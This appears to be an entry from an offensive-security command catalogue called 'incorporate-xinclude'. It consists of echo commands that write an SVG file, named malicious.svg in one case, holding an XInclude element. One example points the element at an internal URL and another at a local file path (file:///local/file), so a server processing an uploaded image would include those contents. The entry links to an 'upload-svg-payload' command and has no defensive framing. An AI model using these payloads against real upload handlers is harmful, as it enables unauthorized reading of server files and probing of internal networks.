---
data: >-
  echo '<text x="10" y="10"> <xi:include href="https://www.google.com/"
  parse="text"/> </text>' > malicious.svg
tags:
  - xinclude
  - svg
type: command
executor: bash
platforms:
  - Linux
  - Windows
id: 8c2dc2e1-c658-453c-8f2c-b97ed801e2fb
created_at: '2025-12-13T09:00:28.092Z'
updated_at: '2025-12-13T09:00:28.092Z'
verified: false
validated: true
submitted: true
---
# incorporate-xinclude

## Command

```bash
echo '<text x="10" y="10"> <xi:include href="https://www.google.com/" parse="text"/> </text>' > malicious.svg
```

## Description

Adds an XInclude element to an SVG file for including external text content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `href` | URL to include | Yes |
| `parse` | Parse type (text) | Yes |

## Examples

### Basic Usage

```bash
echo '<text> <xi:include href="http://internal/" parse="text"/> </text>' > svg.xml
```

### Advanced Usage

```bash
echo '<text> <xi:include href="file:///local/file" parse="text"/> </text>' > local.svg
```

## Expected Output

SVG file with XInclude for data inclusion.

## Related

- [[commands/upload-svg-payload]]
- [[procedures/Use-XIncludes-for-Data-Inclusion]]
